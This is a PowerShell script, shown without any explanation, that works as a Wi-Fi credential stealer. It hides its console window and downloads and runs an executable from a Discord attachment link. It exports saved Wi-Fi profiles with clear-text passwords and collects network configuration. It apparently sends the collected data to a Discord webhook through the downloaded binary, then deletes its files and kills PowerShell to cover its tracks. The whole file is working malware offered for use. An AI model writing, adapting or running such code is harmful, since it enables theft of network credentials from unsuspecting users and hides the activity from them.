
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class WinAPI {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@ 

$hwnd = [WinAPI]::GetConsoleWindow()
[WinAPI]::ShowWindow($hwnd, 0) 
 
Invoke-WebRequest "https://media.discordapp.net/attachments/1055546374344679557/1476436885902725313/fun.exe?ex=69a11e80&is=699fcd00&hm=ed6cd47bf6f089d1912a8c73a523082647b0a96879977bd113c260f182d214f4&" -OutFile "$env:LOCALAPPDATA\Temp\fun.exe"  -UseBasicParsing 

& "$env:LOCALAPPDATA\Temp\fun.exe"
$webhook_base = "https://discord.com/api/webhooks/"


$e = "$env:LOCALAPPDATA\Temp"
$zip = "$env:TEMP\funny_stuff_folder.zip"
ipconfig /all | Out-File "$e\ipcfg.txt"

while (-not (Test-Path $zip)) {
    Start-Sleep -Seconds 1
}

netsh wlan export profile key=clear folder=$e | Out-Null
if (-not $wh.StartsWith("https://discord.com/api/webhooks/")) {
    $wh = $webhook_base + $wh
}   


$wifiFile = "$e\wifi.txt"
Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
    $x = [xml](Get-Content $_)
    $ssid = $x.WLANProfile.SSIDConfig.SSID.name
    $pass = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial
    "SSID:$ssid | Password:$pass" | Out-File -Append -FilePath $wifiFile
}
Write-Output $wh


# Send to discord

& "$env:LOCALAPPDATA\Temp\fun.exe" --wh $wh

# cleanup
cls
Start-Sleep -Seconds 3


$cleanupJob = {
    param(
        $wifiFile,
        $e,
        $zip
    )

    while (Test-Path "$env:LOCALAPPDATA\Temp\fun.exe") {
        try {
            Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force -ErrorAction Stop
            Remove-Item -Path $wifiFile -Force -ErrorAction Stop
            Remove-Item -Path (Join-Path $e 'ipcfg.txt') -Force -ErrorAction Stop
            Remove-Item -Path $zip -Force -ErrorAction Stop
        } catch {
            # ignore errors
        }

        Start-Sleep -Seconds 1
    }
}

 while (Test-Path "$env:LOCALAPPDATA\Temp\fun.exe") {
    try {
        Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force -ErrorAction Stop
        Remove-Item -Path $wifiFile -Force -ErrorAction Stop
        Remove-Item -Path (Join-Path $e 'ipcfg.txt') -Force -ErrorAction Stop
        Remove-Item -Path $zip -Force -ErrorAction Stop
    } catch {}

    Start-Sleep -Seconds 1
}



#exit quickly
taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
